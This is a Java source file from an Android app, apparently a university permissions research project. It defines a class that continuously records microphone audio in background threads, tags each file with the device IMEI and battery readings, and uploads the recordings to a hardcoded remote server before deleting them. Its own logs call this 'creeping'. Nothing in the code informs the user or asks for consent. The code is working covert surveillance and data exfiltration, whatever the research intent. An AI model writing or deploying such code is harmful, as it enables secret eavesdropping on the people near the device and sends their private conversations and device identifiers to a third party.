package edu.uiuc.permissionschecker;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;

public class ImprovedCreepyAudioRecorder {
	AudioActivity context;
	MediaRecorder recorder;
	long scantime = 30000L;
	long uploadtime = 30000L;
	File dir;
	File currentrec;
	String url = "http://mosyg2.cs.uiuc.edu/~marsan1/android/something2.php";
	String imei;
	public ImprovedCreepyAudioRecorder(AudioActivity context, String url) {
		this.context = context;
		this.url = url;
		dir = new File(context.getFilesDir(), "recordings");
		dir.mkdirs();
		scantime = context.getAudioInterval();
		uploadtime = context.getUploadInterval();
		TelephonyManager service = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		imei = service.getDeviceId();
	}
	
	
	
	public class RecordThread extends Thread {
		boolean keeprunning = true;
		int count = 0;
		public void run() {
			while(keeprunning) {
				scantime = context.getAudioInterval();
				recordAudioForMilliseconds(scantime);
				count += 1;
			}
		}
	}
	public class UploadThread extends Thread {
		boolean keeprunning = true;
		public void run() {
			while (keeprunning) {
				uploadtime = context.getUploadInterval();
				Long curtime = System.currentTimeMillis();
				Log.d("AudioCreeperUploader", "looking for files to upload (once ever "+uploadtime+" milliseconds)");
				if (uploadtime > 0) {
					scanForFilesAndUpload();
				} else {
					//-1 means we don't upload. so just wait 30 seconds
					uploadtime = 30000L;
				}
				Long timediff = System.currentTimeMillis()-curtime;
				if (timediff > 0) {
					 try {
							Thread.sleep(uploadtime-timediff);
					 } catch (Exception e) {
						 e.printStackTrace();
					 }
				}
			}
		}
	}
	
	RecordThread recordThread;
	UploadThread uploadThread;
	
	
	public void startBackgroundRecording() {
		recordThread = new RecordThread();
		recordThread.start();
		uploadThread = new UploadThread();
		uploadThread.start();
		Log.d("AudioCreeper", "STARTING RECORDING AND UPLOADING");
	}
	
	public void stopBackgroundRecording() {
		
		if (recordThread == null) return;
		recordThread.keeprunning = false;
		recordThread = null;
		uploadThread.keeprunning = false;
		uploadThread = null;
		Log.d("AudioCreeper", "STOPPING RECORDING AND UPLOADING");
	}
	
	public boolean toggleBackgroundRecording() {
		if (recordThread == null || recordThread.keeprunning == false) {
			startBackgroundRecording();
			return true;
		} else {
			stopBackgroundRecording();
			return false;
		}
	}

	
	public void record(String path) throws IllegalStateException, IOException {
		recorder = new MediaRecorder();
	    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	    recorder.setOutputFile(path);
	    recorder.prepare();
	    recorder.start();
	}
	
	public void stop() throws IOException {
		recorder.stop();
		recorder.release();
	}

	
	
	
	
	
	public void recordAudioForMilliseconds(long milliseconds) {
		File file = new File(dir, makeFilename(milliseconds));
		currentrec = file;
		try {
			Log.d("AudioCreeperRecorder", "starting another round of wonderful creeping for "+milliseconds+ " milliseconds to file "+file);
			record(file.getAbsolutePath());
			Thread.sleep(milliseconds);
			stop();
		} catch (Exception e) {
			e.printStackTrace();
		} 
	}
	
	public String makeFilename(long milliseconds) {
		Intent i = context.getApplicationContext().registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		int level = i.getIntExtra("level", 0);
		int voltage = i.getIntExtra("voltage", 0);
		return imei+"_l-"+milliseconds+"ms_c-"+recordThread.count+"_t-"+System.currentTimeMillis()+"_batt-l-"+level+"_batt-v-"+voltage+".3gp";
	}
	
	public void scanForFilesAndUpload() {
		for (File f : dir.listFiles()) {
			if (f.toString().endsWith(".3gp") && !f.equals(currentrec)) {
				//upload it and delete it!
				Log.d("AudioCreeperUploader", "Found file "+f+" uploading and deleting!");
				uploadFile(f, true);
			}
		}
	}
	
	
	public void uploadFile(final File file,final boolean deleteonfinish) {
		Log.d("UploadFile", "Uploading "+file);
		new Runnable() {
			public void run() {
				uploadFile_internal(file); //dammit alejandro formatting mosyg2
				if (deleteonfinish) file.delete();
			}
		}.run();
	}
	
	
	
	public void uploadFile_internal(File NAME_OF_FILE) {

		try {
			FileInputStream fis = new FileInputStream(NAME_OF_FILE);
			HttpFileUploader htfu = new HttpFileUploader(url, "noparamshere", NAME_OF_FILE.getName());
			htfu.doStart(fis);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}

	
}
